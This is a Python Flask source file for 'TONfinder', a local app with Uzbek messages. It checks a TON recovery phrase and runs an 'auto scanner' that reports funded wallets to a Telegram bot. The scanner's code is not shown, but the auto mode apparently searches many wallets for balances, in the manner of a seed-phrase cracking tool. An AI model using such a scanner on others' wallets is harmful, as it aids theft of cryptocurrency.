from __future__ import annotations

import json
import os
import secrets
import subprocess
import threading
import time
import webbrowser
from collections import defaultdict, deque
from pathlib import Path
from typing import Any

import requests
from flask import Flask, jsonify, render_template, request, Response, session


BASE_DIR = Path(__file__).resolve().parent
BRIDGE_PATH = BASE_DIR / "dist" / "bridge.js"
BRIDGE_AUTO_PATH = BASE_DIR / "dist" / "auto-bridge.js"
SETTINGS_PATH = BASE_DIR / "settings.json"

_auto_process: subprocess.Popen | None = None
_auto_lock = threading.Lock()
LOOPBACK_HOSTS = {"127.0.0.1", "localhost", "[::1]", "::1"}


def create_app(testing: bool = False) -> Flask:
    app = Flask(__name__)
    app.config.update(
        TESTING=testing,
        SECRET_KEY=secrets.token_hex(32),
        MAX_CONTENT_LENGTH=8 * 1024,
        SESSION_COOKIE_HTTPONLY=True,
        SESSION_COOKIE_SAMESITE="Strict",
        SESSION_COOKIE_SECURE=False,
    )

    attempts: dict[str, deque[float]] = defaultdict(deque)
    attempts_lock = threading.Lock()

    @app.after_request
    def security_headers(response):
        response.headers["Cache-Control"] = "no-store, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Referrer-Policy"] = "no-referrer"
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; script-src 'self'; "
            "style-src 'self' https://fonts.googleapis.com; "
            "font-src 'self' https://fonts.gstatic.com; "
            "img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; "
            "form-action 'self'; base-uri 'none'"
        )
        return response

    @app.get("/")
    def index():
        token = secrets.token_urlsafe(32)
        session["csrf_token"] = token
        return render_template("index.html", csrf_token=token)

    @app.get("/health")
    def health():
        return jsonify({"ok": BRIDGE_PATH.exists()})

    @app.post("/api/recover")
    def recover():
        if not _is_local_request() and not app.testing:
            return _error("Ilova faqat localhost orqali ishlaydi.", 403)

        expected_token = session.get("csrf_token")
        supplied_token = request.headers.get("X-CSRF-Token")
        if not expected_token or not secrets.compare_digest(expected_token, supplied_token or ""):
            return _error("Sessiya eskirgan. Sahifani yangilang.", 403)

        if not request.is_json:
            return _error("Faqat JSON so‘rov qabul qilinadi.", 415)

        remote = request.remote_addr or "local"
        if not _within_rate_limit(attempts, attempts_lock, remote):
            return _error("Juda ko‘p urinish. Bir daqiqadan keyin qayta urinib ko‘ring.", 429)

        payload = request.get_json(silent=True)
        if not isinstance(payload, dict):
            return _error("So‘rov formati noto‘g‘ri.", 400)

        mnemonic = payload.get("mnemonic")
        network = payload.get("network", "mainnet")
        offline = payload.get("offline", False)

        if not isinstance(mnemonic, str) or not mnemonic.strip():
            return _error("Recovery phrase kiriting.", 400)
        if len(mnemonic) > 512:
            return _error("Recovery phrase juda uzun.", 400)
        if network not in {"mainnet", "testnet"}:
            return _error("Tarmoq noto‘g‘ri.", 400)
        if not isinstance(offline, bool):
            return _error("Offline qiymati noto‘g‘ri.", 400)
        if not BRIDGE_PATH.exists():
            return _error("TON moduli yig‘ilmagan. npm run build buyrug‘ini bajaring.", 503)

        result = _run_bridge(mnemonic, network, offline)
        if "error" in result:
            return _error(str(result["error"]), 400)

        tg_status = _send_telegram_notification(
            result.get("wallets", []),
            result.get("network", network),
        )
        if tg_status:
            result["telegram"] = tg_status

        return jsonify(result)

    @app.get("/api/settings")
    def get_settings():
        if not _is_local_request() and not app.testing:
            return _error("Faqat localhost.", 403)
        data = _load_settings()
        return jsonify({
            "bot_token": _mask_token(data.get("bot_token", "")),
            "user_id": data.get("user_id", ""),
            "notify_enabled": data.get("notify_enabled", False),
            "has_token": bool(data.get("bot_token", "")),
        })

    @app.post("/api/settings")
    def save_settings():
        if not _is_local_request() and not app.testing:
            return _error("Faqat localhost.", 403)

        expected_token = session.get("csrf_token")
        supplied_token = request.headers.get("X-CSRF-Token")
        if not expected_token or not secrets.compare_digest(expected_token, supplied_token or ""):
            return _error("Sessiya eskirgan. Sahifani yangilang.", 403)

        if not request.is_json:
            return _error("Faqat JSON.", 415)

        payload = request.get_json(silent=True)
        if not isinstance(payload, dict):
            return _error("Noto‘g‘ri format.", 400)

        bot_token = payload.get("bot_token", "")
        user_id = payload.get("user_id", "")
        notify_enabled = payload.get("notify_enabled", False)

        if not isinstance(bot_token, str) or not isinstance(user_id, str):
            return _error("Noto‘g‘ri qiymat.", 400)
        if not isinstance(notify_enabled, bool):
            return _error("notify_enabled boolean bo‘lishi kerak.", 400)
        if not bot_token.strip():
            return _error("Bot token majburiy.", 400)
        if not user_id.strip():
            return _error("Telegram User ID majburiy.", 400)

        current = _load_settings()
        current["bot_token"] = bot_token.strip()
        current["user_id"] = user_id.strip()
        current["notify_enabled"] = notify_enabled
        _save_settings(current)

        return jsonify({
            "bot_token": _mask_token(current["bot_token"]),
            "user_id": current["user_id"],
            "notify_enabled": current["notify_enabled"],
            "has_token": bool(current["bot_token"]),
        })

    @app.get("/api/auto/start")
    def auto_start():
        if not _is_local_request() and not app.testing:
            return _error("Faqat localhost.", 403)

        global _auto_process
        with _auto_lock:
            if _auto_process is not None:
                return _error("Avtomatik skaner allaqachon ishlamoqda.", 409)

            network = request.args.get("network", "mainnet")
            if network not in {"mainnet", "testnet"}:
                return _error("Tarmoq noto‘g‘ri.", 400)

            max_checks = request.args.get("max_checks", "0")
            try:
                max_checks_int = int(max_checks)
                if max_checks_int < 0:
                    raise ValueError
            except ValueError:
                return _error("max_checks noto‘g‘ri.", 400)

            if not BRIDGE_AUTO_PATH.exists():
                return _error("auto-bridge yig‘ilmagan. npm run build.", 503)

            settings_data = _load_settings()
            api_key_arg = settings_data.get("api_key", "")

            try:
                interval = "400" if api_key_arg else "1200"
                proc = subprocess.Popen(
                    ["node", str(BRIDGE_AUTO_PATH), network, interval, api_key_arg, str(max_checks_int)],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding="utf-8",
                    cwd=BASE_DIR,
                    creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
                )
            except OSError as e:
                return _error(f"Ishga tushmadi: {e}", 500)

            _auto_process = proc

        def generate():
            nonlocal proc
            try:
                for line in iter(proc.stdout.readline, ""):
                    if not line.strip():
                        continue
                    # Send Telegram notification if balance > 0 found
                    try:
                        payload = json.loads(line)
                        if payload.get("type") == "result" and payload.get("hasBalance"):
                            tg_status = _send_telegram_notification(
                                payload.get("wallets", []), network
                            )
                            if tg_status:
                                payload["telegram"] = tg_status
                                line = json.dumps(payload, ensure_ascii=False)
                    except (json.JSONDecodeError, TypeError):
                        pass
                    yield f"data: {line.strip()}\n\n"
            except GeneratorExit:
                pass
            finally:
                with _auto_lock:
                    if _auto_process is proc:
                        _auto_process = None
                try:
                    proc.stdin.write('{"command":"stop"}\n')
                    proc.stdin.flush()
                except OSError:
                    pass
                proc.kill()
                proc.wait(timeout=5)

        return Response(generate(), content_type="text/event-stream")

    @app.post("/api/auto/stop")
    def auto_stop():
        if not _is_local_request() and not app.testing:
            return _error("Faqat localhost.", 403)

        global _auto_process
        with _auto_lock:
            if _auto_process is None:
                return jsonify({"status": "not_running"})
            proc = _auto_process
            _auto_process = None
            try:
                proc.stdin.write('{"command":"stop"}\n')
                proc.stdin.flush()
            except OSError:
                proc.kill()
            proc.wait(timeout=5)

        return jsonify({"status": "stopped"})

    @app.post("/api/auto/pause")
    def auto_pause():
        if not _is_local_request() and not app.testing:
            return _error("Faqat localhost.", 403)
        with _auto_lock:
            if _auto_process is None:
                return jsonify({"status": "not_running"})
            try:
                _auto_process.stdin.write('{"command":"pause"}\n')
                _auto_process.stdin.flush()
            except OSError:
                pass
        return jsonify({"status": "paused"})

    @app.post("/api/auto/resume")
    def auto_resume():
        if not _is_local_request() and not app.testing:
            return _error("Faqat localhost.", 403)
        with _auto_lock:
            if _auto_process is None:
                return jsonify({"status": "not_running"})
            try:
                _auto_process.stdin.write('{"command":"resume"}\n')
                _auto_process.stdin.flush()
            except OSError:
                pass
        return jsonify({"status": "resumed"})

    @app.errorhandler(413)
    def too_large(_error_value):
        return _error("So‘rov hajmi juda katta.", 413)

    return app


def _is_local_request() -> bool:
    remote = request.remote_addr or ""
    host = request.host.split(":", maxsplit=1)[0]
    return remote in {"127.0.0.1", "::1"} and host in LOOPBACK_HOSTS


def _within_rate_limit(
    attempts: dict[str, deque[float]],
    lock: threading.Lock,
    remote: str,
    limit: int = 10,
) -> bool:
    now = time.monotonic()
    with lock:
        bucket = attempts[remote]
        while bucket and now - bucket[0] > 60:
            bucket.popleft()
        if len(bucket) >= limit:
            return False
        bucket.append(now)
        return True


def _run_bridge(mnemonic: str, network: str, offline: bool) -> dict[str, Any]:
    request_data = json.dumps(
        {"mnemonic": mnemonic, "network": network, "offline": offline},
        ensure_ascii=False,
    )
    try:
        process = subprocess.run(
            ["node", str(BRIDGE_PATH)],
            input=request_data,
            capture_output=True,
            text=True,
            encoding="utf-8",
            timeout=45,
            cwd=BASE_DIR,
            check=False,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
    except (OSError, subprocess.TimeoutExpired):
        return {"error": "TON tekshiruvi ishga tushmadi yoki vaqt tugadi."}

    try:
        result = json.loads(process.stdout)
    except (json.JSONDecodeError, TypeError):
        return {"error": "TON modulidan noto‘g‘ri javob olindi."}

    if not isinstance(result, dict):
        return {"error": "TON modulidan noto‘g‘ri javob olindi."}
    return result


def _error(message: str, status: int):
    return jsonify({"error": message}), status


def _load_settings() -> dict[str, Any]:
    dflt = {"bot_token": "", "user_id": "", "notify_enabled": False, "api_key": ""}
    env = {
        "bot_token": os.environ.get("BOT_TOKEN", ""),
        "user_id": os.environ.get("USER_ID", ""),
        "notify_enabled": os.environ.get("NOTIFY_ENABLED", "").lower() in ("1", "true", "yes"),
        "api_key": os.environ.get("API_KEY", ""),
    }
    if any(v for v in env.values()):
        return env
    if not SETTINGS_PATH.exists():
        return dflt
    try:
        data = json.loads(SETTINGS_PATH.read_text(encoding="utf-8"))
        if isinstance(data, dict):
            for k in dflt:
                data.setdefault(k, dflt[k])
            return data
    except (json.JSONDecodeError, OSError):
        pass
    return dflt


def _save_settings(data: dict[str, Any]) -> None:
    path = SETTINGS_PATH
    path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")


def _mask_token(token: str) -> str:
    t = token.strip()
    if len(t) <= 8:
        return "••••" if t else ""
    return t[:4] + "••••" + t[-4:]


def _has_balance(wallet: dict[str, Any]) -> bool:
    try:
        bal = wallet.get("balanceTon", "0")
        if bal is None:
            return False
        return float(bal) > 0
    except (ValueError, TypeError):
        return False


def _format_telegram_message(
    funded: list[dict[str, Any]],
    network: str,
) -> str:
    parts = ["<b>🔔 Balansli hamyon topildi</b>\n"]
    for w in funded:
        bal = w.get("balanceTon", "0") or "0"
        parts.append(
            f"<b>💰 {w['version']}</b> — {bal} TON\n"
            f"<code>{w['nonBounceable']}</code>\n"
            f"<code>{w['bounceable']}</code>\n"
        )
    parts.append(f"<i>#TONfinder #{network}</i>")
    return "\n".join(parts)


def _send_telegram_notification(
    wallets: list[dict[str, Any]],
    network: str,
) -> str | None:
    settings = _load_settings()
    token = settings.get("bot_token", "").strip()
    user_id = settings.get("user_id", "").strip()
    enabled = settings.get("notify_enabled", False)

    if not token or not user_id or not enabled:
        return None
    if network != "mainnet":
        return None

    funded = [w for w in wallets if _has_balance(w)]
    if not funded:
        return None

    text = _format_telegram_message(funded, network)
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        resp = requests.post(
            url,
            json={
                "chat_id": user_id,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=15,
        )
        if resp.ok:
            return "xabar yuborildi"
        return f"Telegram xatosi: {resp.status_code}"
    except requests.RequestException as e:
        return f"Telegram xatosi: {e}"


app = create_app()


if __name__ == "__main__":
    if os.environ.get("RENDER"):
        import gunicorn.app.base  # type: ignore

        host = os.environ.get("HOST", "0.0.0.0")
        port = int(os.environ.get("PORT", "10000"))

        class StandaloneApplication(gunicorn.app.base.BaseApplication):
            def __init__(self, app, options=None):
                self.options = options or {}
                self.application = app
                super().__init__()

            def load_config(self):
                for k, v in self.options.items():
                    self.cfg.set(k.lower(), v)

            def load(self):
                return self.application

        StandaloneApplication(app, {
            "bind": f"{host}:{port}",
            "workers": 1,
            "threads": 4,
            "timeout": 120,
        }).run()
    else:
        from waitress import serve

        host = os.environ.get("TONFINDER_HOST", "127.0.0.1")
        if host not in {"127.0.0.1", "localhost", "::1"}:
            raise SystemExit("Xavfsizlik uchun TONfinder faqat localhost'da ishga tushadi.")
        port = int(os.environ.get("TONFINDER_PORT", "5000"))
        url = f"http://{host}:{port}"
        print(f"TONfinder: {url}")
        if os.environ.get("TONFINDER_NO_BROWSER") != "1":
            threading.Timer(1.0, lambda: webbrowser.open(url)).start()
        serve(app, host=host, port=port, threads=4)
